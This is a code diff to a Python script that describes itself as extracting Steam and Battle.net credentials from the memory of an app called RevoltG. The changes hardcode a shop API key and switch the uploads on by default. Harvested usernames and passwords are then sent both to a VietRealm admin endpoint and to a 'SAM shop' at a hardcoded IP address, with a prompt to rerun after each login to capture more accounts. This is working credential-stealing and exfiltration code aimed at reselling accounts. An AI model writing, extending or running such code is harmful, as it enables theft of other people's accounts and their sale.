@@ -70,9 +70,9 @@ BNET_PRODUCT_CACHE = {
 # Env: SAM_SHOP_URL, SAM_SHOP_KEY, SAM_SHOP_PRICE, SAM_SHOP_UPLOAD=0 to disable
 
 SAM_SHOP_URL = os.environ.get('SAM_SHOP_URL', 'http://26.109.24.117:3847').rstrip('/')
-SAM_SHOP_KEY = os.environ.get('SAM_SHOP_KEY', '')  # đặt env SAM_SHOP_KEY để upload SAM shop (nếu cần)
+SAM_SHOP_KEY = os.environ.get('SAM_SHOP_KEY', 'sam_d1fa394e09141f1eae75e64f6202dba5ff27e3711f39fb11')  # Shop API page -> Rotate key
 SAM_SHOP_PRICE = float(os.environ.get('SAM_SHOP_PRICE', '0') or 0)
-SAM_SHOP_UPLOAD = os.environ.get('SAM_SHOP_UPLOAD', '0') not in ('0', 'false', 'False', '')
+SAM_SHOP_UPLOAD = os.environ.get('SAM_SHOP_UPLOAD', '1') not in ('0', 'false', 'False', '')
 
 # ============================================
 # VietRealm web (vietrealm.asia) - admin -> Tài khoản Revolt
@@ -129,7 +129,6 @@ def banner():
       RevoltG Steam + Battle.net Account Manager
     
    Extracts credentials from RevoltG memory
-   Save to: {VIETREALM_URL}/admin (Tài khoản Revolt)
 ============================================================{C.RESET}
 """)
 
@@ -251,11 +250,18 @@ def vietrealm_existing_usernames():
         req = urllib.request.Request(f"{VIETREALM_URL}/api/revolt", method='GET')
         with urllib.request.urlopen(req, timeout=30) as resp:
             data = json.loads(resp.read().decode('utf-8', errors='replace'))
-            if isinstance(data, list):
-                return {str(a.get('username', '')).strip() for a in data if a.get('username')}
+        out = set()
+        for row in (data or []):
+            if not isinstance(row, dict):
+                continue
+            for k in ('username', 'email'):
+                v = (row.get(k) or '').strip()
+                if v:
+                    out.add(v)
+        return out
     except Exception as e:
-        print(f"{C.YELLOW}[!] VietRealm list fetch failed: {e}{C.RESET}")
-    return set()
+        print(f"{C.YELLOW}[!] VietRealm dedup fetch failed: {e}{C.RESET}")
+        return set()
 
 
 # ============================================
@@ -1205,12 +1211,11 @@ def main():
     # ============================================
 
     db_conn = init_db()
-    all_found = dict(accounts)
     new_accounts = {}
 
-    # Filter out accounts that don't have a usable password or are already dumped
+    # Filter out accounts that don't have a plaintext password or are already dumped
     for k, v in accounts.items():
-        if v.get('password') or v.get('encrypted_password'):
+        if v.get('password'):
             if not is_account_dumped(db_conn, k):
                 new_accounts[k] = v
 
@@ -1299,7 +1304,7 @@ def main():
         print(f"{C.GREEN}[+] Detected running Steam AppID: {running_appid}{C.RESET}")
     
     for i, (username, info) in enumerate(accounts.items(), 1):
-        password = info.get('password') or info.get('encrypted_password') or ''
+        password = info.get('password', '')
         enc_pw = info.get('encrypted_password', '')
         steam_id = info.get('steam_id64') or 'N/A'
         persona = info.get('persona_name') or 'N/A'
@@ -1521,9 +1526,10 @@ def main():
     print(f"\n{C.CYAN}[*] Uploading accounts to VietRealm ({VIETREALM_URL})...{C.RESET}")
 
     existing_on_web = vietrealm_existing_usernames()
+    uploaded = 0
 
     steam_upload = {}
-    for username, info in all_found.items():
+    for username, info in (accounts or {}).items():
         pw = info.get('password') or info.get('encrypted_password') or ''
         if not username or not pw:
             continue
@@ -1531,7 +1537,6 @@ def main():
             continue
         steam_upload[username] = info
 
-    uploaded = 0
     if steam_upload:
         for username, info in steam_upload.items():
             pw = info.get('password') or info.get('encrypted_password') or ''
@@ -1567,26 +1572,19 @@ def main():
             if vietrealm_upload_account(email, pw, email=email, note=' | '.join(bits)):
                 uploaded += 1
 
-    # Upload Steam combos to SAM shop API (optional, disabled by default now)
-    if accounts and SAM_SHOP_UPLOAD:
+    print(f"{C.GREEN}[+] VietRealm done: {uploaded} account(s) sent{C.RESET}")
+
+    # Upload Steam combos to SAM shop API (Telegram removed)
+    if accounts:
         print(f"\n{C.CYAN}[*] Uploading Steam accounts to SAM shop...{C.RESET}")
         print(f"{C.DIM}    {SAM_SHOP_URL}/api/shop/upload/json{C.RESET}")
         sam_shop_upload_steam(accounts)
+    else:
+        print(f"\n{C.DIM}[*] No new Steam accounts to upload{C.RESET}")
 
     print(f"\n{C.DIM}    Run this script again after each new RevoltG login to capture more accounts.{C.RESET}\n")
     db_conn.close()
 
 
-def is_admin():
-    try:
-        return ctypes.windll.shell32.IsUserAnAdmin()
-    except:
-        return False
-
 if __name__ == '__main__':
-    if is_admin():
-        main()
-    else:
-        # Re-run the program with admin rights
-        print("[!] Requesting Administrator privileges...")
-        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+    main()
